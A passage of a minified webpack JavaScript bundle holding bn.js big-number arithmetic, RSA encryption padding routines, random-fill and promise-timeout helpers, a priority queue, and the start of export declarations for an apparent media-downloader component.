                            if (j > 0) for (y.iushrn(j); j-- > 0; ) (C.isOdd() || D.isOdd()) && (C.iadd(yp), D.isub(xp)), C.iushrn(1), D.iushrn(1);
                            x.cmp(y) >= 0 ? (x.isub(y), A.isub(C), B.isub(D)) : (y.isub(x), C.isub(A), D.isub(B));
                        }
                        return { a: C, b: D, gcd: y.iushln(g) };
                    }),
                    (BN.prototype._invmp = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var a = this,
                            b = p.clone();
                        a = 0 !== a.negative ? a.umod(p) : a.clone();
                        for (var res, x1 = new BN(1), x2 = new BN(0), delta = b.clone(); a.cmpn(1) > 0 && b.cmpn(1) > 0; ) {
                            for (var i = 0, im = 1; 0 == (a.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (a.iushrn(i); i-- > 0; ) x1.isOdd() && x1.iadd(delta), x1.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (b.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (b.iushrn(j); j-- > 0; ) x2.isOdd() && x2.iadd(delta), x2.iushrn(1);
                            a.cmp(b) >= 0 ? (a.isub(b), x1.isub(x2)) : (b.isub(a), x2.isub(x1));
                        }
                        return (res = 0 === a.cmpn(1) ? x1 : x2).cmpn(0) < 0 && res.iadd(p), res;
                    }),
                    (BN.prototype.gcd = function (num) {
                        if (this.isZero()) return num.abs();
                        if (num.isZero()) return this.abs();
                        var a = this.clone(),
                            b = num.clone();
                        (a.negative = 0), (b.negative = 0);
                        for (var shift = 0; a.isEven() && b.isEven(); shift++) a.iushrn(1), b.iushrn(1);
                        for (;;) {
                            for (; a.isEven(); ) a.iushrn(1);
                            for (; b.isEven(); ) b.iushrn(1);
                            var r = a.cmp(b);
                            if (r < 0) {
                                var t = a;
                                (a = b), (b = t);
                            } else if (0 === r || 0 === b.cmpn(1)) break;
                            a.isub(b);
                        }
                        return b.iushln(shift);
                    }),
                    (BN.prototype.invm = function (num) {
                        return this.egcd(num).a.umod(num);
                    }),
                    (BN.prototype.isEven = function () {
                        return 0 == (1 & this.words[0]);
                    }),
                    (BN.prototype.isOdd = function () {
                        return 1 == (1 & this.words[0]);
                    }),
                    (BN.prototype.andln = function (num) {
                        return this.words[0] & num;
                    }),
                    (BN.prototype.bincn = function (bit) {
                        assert("number" == typeof bit);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        if (this.length <= s) return this._expand(s + 1), (this.words[s] |= q), this;
                        for (var carry = q, i = s; 0 !== carry && i < this.length; i++) {
                            var w = 0 | this.words[i];
                            (carry = (w += carry) >>> 26), (w &= 67108863), (this.words[i] = w);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.isZero = function () {
                        return 1 === this.length && 0 === this.words[0];
                    }),
                    (BN.prototype.cmpn = function (num) {
                        var res,
                            negative = num < 0;
                        if (0 !== this.negative && !negative) return -1;
                        if (0 === this.negative && negative) return 1;
                        if ((this.strip(), this.length > 1)) res = 1;
                        else {
                            negative && (num = -num), assert(num <= 67108863, "Number is too big");
                            var w = 0 | this.words[0];
                            res = w === num ? 0 : w < num ? -1 : 1;
                        }
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.cmp = function (num) {
                        if (0 !== this.negative && 0 === num.negative) return -1;
                        if (0 === this.negative && 0 !== num.negative) return 1;
                        var res = this.ucmp(num);
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.ucmp = function (num) {
                        if (this.length > num.length) return 1;
                        if (this.length < num.length) return -1;
                        for (var res = 0, i = this.length - 1; i >= 0; i--) {
                            var a = 0 | this.words[i],
                                b = 0 | num.words[i];
                            if (a !== b) {
                                a < b ? (res = -1) : a > b && (res = 1);
                                break;
                            }
                        }
                        return res;
                    }),
                    (BN.prototype.gtn = function (num) {
                        return 1 === this.cmpn(num);
                    }),
                    (BN.prototype.gt = function (num) {
                        return 1 === this.cmp(num);
                    }),
                    (BN.prototype.gten = function (num) {
                        return this.cmpn(num) >= 0;
                    }),
                    (BN.prototype.gte = function (num) {
                        return this.cmp(num) >= 0;
                    }),
                    (BN.prototype.ltn = function (num) {
                        return -1 === this.cmpn(num);
                    }),
                    (BN.prototype.lt = function (num) {
                        return -1 === this.cmp(num);
                    }),
                    (BN.prototype.lten = function (num) {
                        return this.cmpn(num) <= 0;
                    }),
                    (BN.prototype.lte = function (num) {
                        return this.cmp(num) <= 0;
                    }),
                    (BN.prototype.eqn = function (num) {
                        return 0 === this.cmpn(num);
                    }),
                    (BN.prototype.eq = function (num) {
                        return 0 === this.cmp(num);
                    }),
                    (BN.red = function (num) {
                        return new Red(num);
                    }),
                    (BN.prototype.toRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), assert(0 === this.negative, "red works only with positives"), ctx.convertTo(this)._forceRed(ctx);
                    }),
                    (BN.prototype.fromRed = function () {
                        return assert(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this);
                    }),
                    (BN.prototype._forceRed = function (ctx) {
                        return (this.red = ctx), this;
                    }),
                    (BN.prototype.forceRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), this._forceRed(ctx);
                    }),
                    (BN.prototype.redAdd = function (num) {
                        return assert(this.red, "redAdd works only with red numbers"), this.red.add(this, num);
                    }),
                    (BN.prototype.redIAdd = function (num) {
                        return assert(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, num);
                    }),
                    (BN.prototype.redSub = function (num) {
                        return assert(this.red, "redSub works only with red numbers"), this.red.sub(this, num);
                    }),
                    (BN.prototype.redISub = function (num) {
                        return assert(this.red, "redISub works only with red numbers"), this.red.isub(this, num);
                    }),
                    (BN.prototype.redShl = function (num) {
                        return assert(this.red, "redShl works only with red numbers"), this.red.shl(this, num);
                    }),
                    (BN.prototype.redMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.mul(this, num);
                    }),
                    (BN.prototype.redIMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.imul(this, num);
                    }),
                    (BN.prototype.redSqr = function () {
                        return assert(this.red, "redSqr works only with red numbers"), this.red._verify1(this), this.red.sqr(this);
                    }),
                    (BN.prototype.redISqr = function () {
                        return assert(this.red, "redISqr works only with red numbers"), this.red._verify1(this), this.red.isqr(this);
                    }),
                    (BN.prototype.redSqrt = function () {
                        return assert(this.red, "redSqrt works only with red numbers"), this.red._verify1(this), this.red.sqrt(this);
                    }),
                    (BN.prototype.redInvm = function () {
                        return assert(this.red, "redInvm works only with red numbers"), this.red._verify1(this), this.red.invm(this);
                    }),
                    (BN.prototype.redNeg = function () {
                        return assert(this.red, "redNeg works only with red numbers"), this.red._verify1(this), this.red.neg(this);
                    }),
                    (BN.prototype.redPow = function (num) {
                        return assert(this.red && !num.red, "redPow(normalNum)"), this.red._verify1(this), this.red.pow(this, num);
                    });
                var primes = { k256: null, p224: null, p192: null, p25519: null };
                function MPrime(name, p) {
                    (this.name = name), (this.p = new BN(p, 16)), (this.n = this.p.bitLength()), (this.k = new BN(1).iushln(this.n).isub(this.p)), (this.tmp = this._tmp());
                }
                function K256() {
                    MPrime.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f");
                }
                function P224() {
                    MPrime.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001");
                }
                function P192() {
                    MPrime.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff");
                }
                function P25519() {
                    MPrime.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed");
                }
                function Red(m) {
                    if ("string" == typeof m) {
                        var prime = BN._prime(m);
                        (this.m = prime.p), (this.prime = prime);
                    } else assert(m.gtn(1), "modulus must be greater than 1"), (this.m = m), (this.prime = null);
                }
                function Mont(m) {
                    Red.call(this, m),
                        (this.shift = this.m.bitLength()),
                        this.shift % 26 != 0 && (this.shift += 26 - (this.shift % 26)),
                        (this.r = new BN(1).iushln(this.shift)),
                        (this.r2 = this.imod(this.r.sqr())),
                        (this.rinv = this.r._invmp(this.m)),
                        (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
                        (this.minv = this.minv.umod(this.r)),
                        (this.minv = this.r.sub(this.minv));
                }
                (MPrime.prototype._tmp = function () {
                    var tmp = new BN(null);
                    return (tmp.words = new Array(Math.ceil(this.n / 13))), tmp;
                }),
                    (MPrime.prototype.ireduce = function (num) {
                        var rlen,
                            r = num;
                        do {
                            this.split(r, this.tmp), (rlen = (r = (r = this.imulK(r)).iadd(this.tmp)).bitLength());
                        } while (rlen > this.n);
                        var cmp = rlen < this.n ? -1 : r.ucmp(this.p);
                        return 0 === cmp ? ((r.words[0] = 0), (r.length = 1)) : cmp > 0 ? r.isub(this.p) : void 0 !== r.strip ? r.strip() : r._strip(), r;
                    }),
                    (MPrime.prototype.split = function (input, out) {
                        input.iushrn(this.n, 0, out);
                    }),
                    (MPrime.prototype.imulK = function (num) {
                        return num.imul(this.k);
                    }),
                    inherits(K256, MPrime),
                    (K256.prototype.split = function (input, output) {
                        for (var outLen = Math.min(input.length, 9), i = 0; i < outLen; i++) output.words[i] = input.words[i];
                        if (((output.length = outLen), input.length <= 9)) return (input.words[0] = 0), void (input.length = 1);
                        var prev = input.words[9];
                        for (output.words[output.length++] = 4194303 & prev, i = 10; i < input.length; i++) {
                            var next = 0 | input.words[i];
                            (input.words[i - 10] = ((4194303 & next) << 4) | (prev >>> 22)), (prev = next);
                        }
                        (prev >>>= 22), (input.words[i - 10] = prev), 0 === prev && input.length > 10 ? (input.length -= 10) : (input.length -= 9);
                    }),
                    (K256.prototype.imulK = function (num) {
                        (num.words[num.length] = 0), (num.words[num.length + 1] = 0), (num.length += 2);
                        for (var lo = 0, i = 0; i < num.length; i++) {
                            var w = 0 | num.words[i];
                            (lo += 977 * w), (num.words[i] = 67108863 & lo), (lo = 64 * w + ((lo / 67108864) | 0));
                        }
                        return 0 === num.words[num.length - 1] && (num.length--, 0 === num.words[num.length - 1] && num.length--), num;
                    }),
                    inherits(P224, MPrime),
                    inherits(P192, MPrime),
                    inherits(P25519, MPrime),
                    (P25519.prototype.imulK = function (num) {
                        for (var carry = 0, i = 0; i < num.length; i++) {
                            var hi = 19 * (0 | num.words[i]) + carry,
                                lo = 67108863 & hi;
                            (hi >>>= 26), (num.words[i] = lo), (carry = hi);
                        }
                        return 0 !== carry && (num.words[num.length++] = carry), num;
                    }),
                    (BN._prime = function (name) {
                        if (primes[name]) return primes[name];
                        var prime;
                        if ("k256" === name) prime = new K256();
                        else if ("p224" === name) prime = new P224();
                        else if ("p192" === name) prime = new P192();
                        else {
                            if ("p25519" !== name) throw new Error("Unknown prime " + name);
                            prime = new P25519();
                        }
                        return (primes[name] = prime), prime;
                    }),
                    (Red.prototype._verify1 = function (a) {
                        assert(0 === a.negative, "red works only with positives"), assert(a.red, "red works only with red numbers");
                    }),
                    (Red.prototype._verify2 = function (a, b) {
                        assert(0 == (a.negative | b.negative), "red works only with positives"), assert(a.red && a.red === b.red, "red works only with red numbers");
                    }),
                    (Red.prototype.imod = function (a) {
                        return this.prime ? this.prime.ireduce(a)._forceRed(this) : a.umod(this.m)._forceRed(this);
                    }),
                    (Red.prototype.neg = function (a) {
                        return a.isZero() ? a.clone() : this.m.sub(a)._forceRed(this);
                    }),
                    (Red.prototype.add = function (a, b) {
                        this._verify2(a, b);
                        var res = a.add(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.iadd = function (a, b) {
                        this._verify2(a, b);
                        var res = a.iadd(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res;
                    }),
                    (Red.prototype.sub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.sub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.isub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.isub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res;
                    }),
                    (Red.prototype.shl = function (a, num) {
                        return this._verify1(a), this.imod(a.ushln(num));
                    }),
                    (Red.prototype.imul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.imul(b));
                    }),
                    (Red.prototype.mul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.mul(b));
                    }),
                    (Red.prototype.isqr = function (a) {
                        return this.imul(a, a.clone());
                    }),
                    (Red.prototype.sqr = function (a) {
                        return this.mul(a, a);
                    }),
                    (Red.prototype.sqrt = function (a) {
                        if (a.isZero()) return a.clone();
                        var mod3 = this.m.andln(3);
                        if ((assert(mod3 % 2 == 1), 3 === mod3)) {
                            var pow = this.m.add(new BN(1)).iushrn(2);
                            return this.pow(a, pow);
                        }
                        for (var q = this.m.subn(1), s = 0; !q.isZero() && 0 === q.andln(1); ) s++, q.iushrn(1);
                        assert(!q.isZero());
                        var one = new BN(1).toRed(this),
                            nOne = one.redNeg(),
                            lpow = this.m.subn(1).iushrn(1),
                            z = this.m.bitLength();
                        for (z = new BN(2 * z * z).toRed(this); 0 !== this.pow(z, lpow).cmp(nOne); ) z.redIAdd(nOne);
                        for (var c = this.pow(z, q), r = this.pow(a, q.addn(1).iushrn(1)), t = this.pow(a, q), m = s; 0 !== t.cmp(one); ) {
                            for (var tmp = t, i = 0; 0 !== tmp.cmp(one); i++) tmp = tmp.redSqr();
                            assert(i < m);
                            var b = this.pow(c, new BN(1).iushln(m - i - 1));
                            (r = r.redMul(b)), (c = b.redSqr()), (t = t.redMul(c)), (m = i);
                        }
                        return r;
                    }),
                    (Red.prototype.invm = function (a) {
                        var inv = a._invmp(this.m);
                        return 0 !== inv.negative ? ((inv.negative = 0), this.imod(inv).redNeg()) : this.imod(inv);
                    }),
                    (Red.prototype.pow = function (a, num) {
                        if (num.isZero()) return new BN(1).toRed(this);
                        if (0 === num.cmpn(1)) return a.clone();
                        var wnd = new Array(16);
                        (wnd[0] = new BN(1).toRed(this)), (wnd[1] = a);
                        for (var i = 2; i < wnd.length; i++) wnd[i] = this.mul(wnd[i - 1], a);
                        var res = wnd[0],
                            current = 0,
                            currentLen = 0,
                            start = num.bitLength() % 26;
                        for (0 === start && (start = 26), i = num.length - 1; i >= 0; i--) {
                            for (var word = num.words[i], j = start - 1; j >= 0; j--) {
                                var bit = (word >> j) & 1;
                                res !== wnd[0] && (res = this.sqr(res)),
                                    0 !== bit || 0 !== current ? ((current <<= 1), (current |= bit), (4 === ++currentLen || (0 === i && 0 === j)) && ((res = this.mul(res, wnd[current])), (currentLen = 0), (current = 0))) : (currentLen = 0);
                            }
                            start = 26;
                        }
                        return res;
                    }),
                    (Red.prototype.convertTo = function (num) {
                        var r = num.umod(this.m);
                        return r === num ? r.clone() : r;
                    }),
                    (Red.prototype.convertFrom = function (num) {
                        var res = num.clone();
                        return (res.red = null), res;
                    }),
                    (BN.mont = function (num) {
                        return new Mont(num);
                    }),
                    inherits(Mont, Red),
                    (Mont.prototype.convertTo = function (num) {
                        return this.imod(num.ushln(this.shift));
                    }),
                    (Mont.prototype.convertFrom = function (num) {
                        var r = this.imod(num.mul(this.rinv));
                        return (r.red = null), r;
                    }),
                    (Mont.prototype.imul = function (a, b) {
                        if (a.isZero() || b.isZero()) return (a.words[0] = 0), (a.length = 1), a;
                        var t = a.imul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.mul = function (a, b) {
                        if (a.isZero() || b.isZero()) return new BN(0)._forceRed(this);
                        var t = a.mul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.invm = function (a) {
                        return this.imod(a._invmp(this.m).mul(this.r2))._forceRed(this);
                    });
            })(module, this);
        }.call(this, __webpack_require__(23)(module)));
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        (exports.publicEncrypt = __webpack_require__(285)),
            (exports.privateDecrypt = __webpack_require__(287)),
            (exports.privateEncrypt = function (key, buf) {
                return exports.publicEncrypt(key, buf, !0);
            }),
            (exports.publicDecrypt = function (key, buf) {
                return exports.privateDecrypt(key, buf, !0);
            });
    },
    function (module, exports, __webpack_require__) {
        var parseKeys = __webpack_require__(42),
            randomBytes = __webpack_require__(24),
            createHash = __webpack_require__(33),
            mgf = __webpack_require__(131),
            xor = __webpack_require__(132),
            BN = __webpack_require__(66),
            withPublic = __webpack_require__(133),
            crt = __webpack_require__(57),
            Buffer = __webpack_require__(5).Buffer;
        module.exports = function (publicKey, msg, reverse) {
            var padding;
            padding = publicKey.padding ? publicKey.padding : reverse ? 1 : 4;
            var paddedMsg,
                key = parseKeys(publicKey);
            if (4 === padding)
                paddedMsg = (function (key, msg) {
                    var k = key.modulus.byteLength(),
                        mLen = msg.length,
                        iHash = createHash("sha1").update(Buffer.alloc(0)).digest(),
                        hLen = iHash.length,
                        hLen2 = 2 * hLen;
                    if (mLen > k - hLen2 - 2) throw new Error("message too long");
                    var ps = Buffer.alloc(k - mLen - hLen2 - 2),
                        dblen = k - hLen - 1,
                        seed = randomBytes(hLen),
                        maskedDb = xor(Buffer.concat([iHash, ps, Buffer.alloc(1, 1), msg], dblen), mgf(seed, dblen)),
                        maskedSeed = xor(seed, mgf(maskedDb, hLen));
                    return new BN(Buffer.concat([Buffer.alloc(1), maskedSeed, maskedDb], k));
                })(key, msg);
            else if (1 === padding)
                paddedMsg = (function (key, msg, reverse) {
                    var ps,
                        mLen = msg.length,
                        k = key.modulus.byteLength();
                    if (mLen > k - 11) throw new Error("message too long");
                    ps = reverse
                        ? Buffer.alloc(k - mLen - 3, 255)
                        : (function (len) {
                              var num,
                                  out = Buffer.allocUnsafe(len),
                                  i = 0,
                                  cache = randomBytes(2 * len),
                                  cur = 0;
                              for (; i < len; ) cur === cache.length && ((cache = randomBytes(2 * len)), (cur = 0)), (num = cache[cur++]) && (out[i++] = num);
                              return out;
                          })(k - mLen - 3);
                    return new BN(Buffer.concat([Buffer.from([0, reverse ? 1 : 2]), ps, Buffer.alloc(1), msg], k));
                })(key, msg, reverse);
            else {
                if (3 !== padding) throw new Error("unknown padding");
                if ((paddedMsg = new BN(msg)).cmp(key.modulus) >= 0) throw new Error("data too long for modulus");
            }
            return reverse ? crt(paddedMsg, key) : withPublic(paddedMsg, key);
        };
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        var parseKeys = __webpack_require__(42),
            mgf = __webpack_require__(131),
            xor = __webpack_require__(132),
            BN = __webpack_require__(66),
            crt = __webpack_require__(57),
            createHash = __webpack_require__(33),
            withPublic = __webpack_require__(133),
            Buffer = __webpack_require__(5).Buffer;
        module.exports = function (privateKey, enc, reverse) {
            var padding;
            padding = privateKey.padding ? privateKey.padding : reverse ? 1 : 4;
            var msg,
                key = parseKeys(privateKey),
                k = key.modulus.byteLength();
            if (enc.length > k || new BN(enc).cmp(key.modulus) >= 0) throw new Error("decryption error");
            msg = reverse ? withPublic(new BN(enc), key) : crt(enc, key);
            var zBuffer = Buffer.alloc(k - msg.length);
            if (((msg = Buffer.concat([zBuffer, msg], k)), 4 === padding))
                return (function (key, msg) {
                    var k = key.modulus.byteLength(),
                        iHash = createHash("sha1").update(Buffer.alloc(0)).digest(),
                        hLen = iHash.length;
                    if (0 !== msg[0]) throw new Error("decryption error");
                    var maskedSeed = msg.slice(1, hLen + 1),
                        maskedDb = msg.slice(hLen + 1),
                        seed = xor(maskedSeed, mgf(maskedDb, hLen)),
                        db = xor(maskedDb, mgf(seed, k - hLen - 1));
                    if (
                        (function (a, b) {
                            (a = Buffer.from(a)), (b = Buffer.from(b));
                            var dif = 0,
                                len = a.length;
                            a.length !== b.length && (dif++, (len = Math.min(a.length, b.length)));
                            var i = -1;
                            for (; ++i < len; ) dif += a[i] ^ b[i];
                            return dif;
                        })(iHash, db.slice(0, hLen))
                    )
                        throw new Error("decryption error");
                    var i = hLen;
                    for (; 0 === db[i]; ) i++;
                    if (1 !== db[i++]) throw new Error("decryption error");
                    return db.slice(i);
                })(key, msg);
            if (1 === padding)
                return (function (key, msg, reverse) {
                    var p1 = msg.slice(0, 2),
                        i = 2,
                        status = 0;
                    for (; 0 !== msg[i++]; )
                        if (i >= msg.length) {
                            status++;
                            break;
                        }
                    var ps = msg.slice(2, i - 1);
                    (("0002" !== p1.toString("hex") && !reverse) || ("0001" !== p1.toString("hex") && reverse)) && status++;
                    ps.length < 8 && status++;
                    if (status) throw new Error("decryption error");
                    return msg.slice(i);
                })(0, msg, reverse);
            if (3 === padding) return msg;
            throw new Error("unknown padding");
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (global, process) {
            function oldBrowser() {
                throw new Error("secure random number generation not supported by this browser\nuse chrome, FireFox or Internet Explorer 11");
            }
            var safeBuffer = __webpack_require__(5),
                randombytes = __webpack_require__(24),
                Buffer = safeBuffer.Buffer,
                kBufferMaxLength = safeBuffer.kMaxLength,
                crypto = global.crypto || global.msCrypto,
                kMaxUint32 = Math.pow(2, 32) - 1;
            function assertOffset(offset, length) {
                if ("number" != typeof offset || offset != offset) throw new TypeError("offset must be a number");
                if (offset > kMaxUint32 || offset < 0) throw new TypeError("offset must be a uint32");
                if (offset > kBufferMaxLength || offset > length) throw new RangeError("offset out of range");
            }
            function assertSize(size, offset, length) {
                if ("number" != typeof size || size != size) throw new TypeError("size must be a number");
                if (size > kMaxUint32 || size < 0) throw new TypeError("size must be a uint32");
                if (size + offset > length || size > kBufferMaxLength) throw new RangeError("buffer too small");
            }
            function actualFill(buf, offset, size, cb) {
                if (process.browser) {
                    var ourBuf = buf.buffer,
                        uint = new Uint8Array(ourBuf, offset, size);
                    return (
                        crypto.getRandomValues(uint),
                        cb
                            ? void process.nextTick(function () {
                                  cb(null, buf);
                              })
                            : buf
                    );
                }
                if (!cb) return randombytes(size).copy(buf, offset), buf;
                randombytes(size, function (err, bytes) {
                    if (err) return cb(err);
                    bytes.copy(buf, offset), cb(null, buf);
                });
            }
            (crypto && crypto.getRandomValues) || !process.browser
                ? ((exports.randomFill = function (buf, offset, size, cb) {
                      if (!(Buffer.isBuffer(buf) || buf instanceof global.Uint8Array)) throw new TypeError('"buf" argument must be a Buffer or Uint8Array');
                      if ("function" == typeof offset) (cb = offset), (offset = 0), (size = buf.length);
                      else if ("function" == typeof size) (cb = size), (size = buf.length - offset);
                      else if ("function" != typeof cb) throw new TypeError('"cb" argument must be a function');
                      return assertOffset(offset, buf.length), assertSize(size, offset, buf.length), actualFill(buf, offset, size, cb);
                  }),
                  (exports.randomFillSync = function (buf, offset, size) {
                      void 0 === offset && (offset = 0);
                      if (!(Buffer.isBuffer(buf) || buf instanceof global.Uint8Array)) throw new TypeError('"buf" argument must be a Buffer or Uint8Array');
                      assertOffset(offset, buf.length), void 0 === size && (size = buf.length - offset);
                      return assertSize(size, offset, buf.length), actualFill(buf, offset, size);
                  }))
                : ((exports.randomFill = oldBrowser), (exports.randomFillSync = oldBrowser));
        }.call(this, __webpack_require__(8), __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const pFinally = __webpack_require__(290);
        class TimeoutError extends Error {
            constructor(message) {
                super(message), (this.name = "TimeoutError");
            }
        }
        const pTimeout = (promise, milliseconds, fallback) =>
            new Promise((resolve, reject) => {
                if ("number" != typeof milliseconds || milliseconds < 0) throw new TypeError("Expected `milliseconds` to be a positive number");
                if (milliseconds === 1 / 0) return void resolve(promise);
                const timer = setTimeout(() => {
                    if ("function" == typeof fallback) {
                        try {
                            resolve(fallback());
                        } catch (error) {
                            reject(error);
                        }
                        return;
                    }
                    const timeoutError = fallback instanceof Error ? fallback : new TimeoutError("string" == typeof fallback ? fallback : `Promise timed out after ${milliseconds} milliseconds`);
                    "function" == typeof promise.cancel && promise.cancel(), reject(timeoutError);
                }, milliseconds);
                pFinally(promise.then(resolve, reject), () => {
                    clearTimeout(timer);
                });
            });
        (module.exports = pTimeout), (module.exports.default = pTimeout), (module.exports.TimeoutError = TimeoutError);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = (promise, onFinally) => (
            (onFinally = onFinally || (() => {})),
            promise.then(
                (val) =>
                    new Promise((resolve) => {
                        resolve(onFinally());
                    }).then(() => val),
                (err) =>
                    new Promise((resolve) => {
                        resolve(onFinally());
                    }).then(() => {
                        throw err;
                    })
            )
        );
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        Object.defineProperty(exports, "__esModule", { value: !0 });
        const lower_bound_1 = __webpack_require__(292);
        exports.default = class {
            constructor() {
                this._queue = [];
            }
            enqueue(run, options) {
                const element = { priority: (options = Object.assign({ priority: 0 }, options)).priority, run: run };
                if (this.size && this._queue[this.size - 1].priority >= options.priority) return void this._queue.push(element);
                const index = lower_bound_1.default(this._queue, element, (a, b) => b.priority - a.priority);
                this._queue.splice(index, 0, element);
            }
            dequeue() {
                const item = this._queue.shift();
                return null == item ? void 0 : item.run;
            }
            filter(options) {
                return this._queue.filter((element) => element.priority === options.priority).map((element) => element.run);
            }
            get size() {
                return this._queue.length;
            }
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        Object.defineProperty(exports, "__esModule", { value: !0 }),
            (exports.default = function (array, value, comparator) {
                let first = 0,
                    count = array.length;
                for (; count > 0; ) {
                    const step = (count / 2) | 0;
                    let it = first + step;
                    comparator(array[it], value) <= 0 ? ((first = ++it), (count -= step + 1)) : (count = step);
                }
                return first;
            });
    },
    ,
    ,
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        __webpack_require__.r(__webpack_exports__);
        var gv_namespaceObject = {};
        __webpack_require__.r(gv_namespaceObject),
            __webpack_require__.d(gv_namespaceObject, "Service", function () {
                return service_Service;
            }),
            __webpack_require__.d(gv_namespaceObject, "Widget", function () {
                return normal;
            }),
            __webpack_require__.d(gv_namespaceObject, "getMediaInfo", function () {
                return get_media_info;
            }),
            __webpack_require__.d(gv_namespaceObject, "downloader", function () {
                return gv_downloader;
            }),
            __webpack_require__.d(gv_namespaceObject, "snap", function () {
                return gv_generic_snap;
            }),
            __webpack_require__.d(gv_namespaceObject, "getLang", function () {
                return lang_detect_getLang;
            }),
            __webpack_require__.d(gv_namespaceObject, "startLangObserver", function () {
                return startLangObserver;
            }),
            __webpack_require__.d(gv_namespaceObject, "getDir", function () {
                return getDir;
            }),
            __webpack_require__.d(gv_namespaceObject, "startDirObserver", function () {
                return startDirObserver;
            }),
            __webpack_require__.d(gv_namespaceObject, "getTheme", function () {
                return getTheme;
            }),
            __webpack_require__.d(gv_namespaceObject, "startThemeObserver", function () {
                return startThemeObserver;
            }),
            __webpack_require__.d(gv_namespaceObject, "isServiceUrl", function () {
                return url_checker_isServiceUrl;
            }),
            __webpack_require__.d(gv_namespaceObject, "isServiceMediaUrl", function () {
                return isServiceMediaUrl;
            }),
            __webpack_require__.d(gv_namespaceObject, "getMediaId", function () {
                return get_media_id;
            }),
            __webpack_require__.d(gv_namespaceObject, "makeCanonicalUrl", function () {
                return make_canonical_url;
            });
        var gv_embed_namespaceObject = {};
        __webpack_require__.r(gv_embed_namespaceObject),
            __webpack_require__.d(gv_embed_namespaceObject, "Service", function () {
                return gv_embed_service_Service;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "Widget", function () {
                return widget_embed;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "getMediaInfo", function () {
                return gv_embed_get_media_info;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "downloader", function () {
                return gv_downloader;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "snap", function () {
                return gv_generic_snap;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "getLang", function () {
                return lang_detect_getLang;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "startLangObserver", function () {
                return startLangObserver;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "getDir", function () {
                return getDir;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "startDirObserver", function () {
                return startDirObserver;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "getTheme", function () {
                return gv_embed_getTheme;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "isServiceUrl", function () {
                return gv_embed_generic_url_checker_isServiceUrl;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "isServiceMediaUrl", function () {
                return url_checker_isServiceMediaUrl;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "getMediaId", function () {
                return get_media_id_embed;
            }),
            __webpack_require__.d(gv_embed_namespaceObject, "makeCanonicalUrl", function () {
                return make_canonical_url;
            });
        var ig_namespaceObject = {};
        __webpack_require__.r(ig_namespaceObject),
            __webpack_require__.d(ig_namespaceObject, "Service", function () {
                return ig_service_Service;
            }),
            __webpack_require__.d(ig_namespaceObject, "Widget", function () {
                return tiny;
            }),
            __webpack_require__.d(ig_namespaceObject, "downloader", function () {
                return ig_downloader;
            }),
            __webpack_require__.d(ig_namespaceObject, "getMediaInfo", function () {
                return ig_get_media_info;
            }),
            __webpack_require__.d(ig_namespaceObject, "snap", function () {
                return ig_snap;
            }),
            __webpack_require__.d(ig_namespaceObject, "getLang", function () {
                return ig_lang_detect_getLang;
            }),
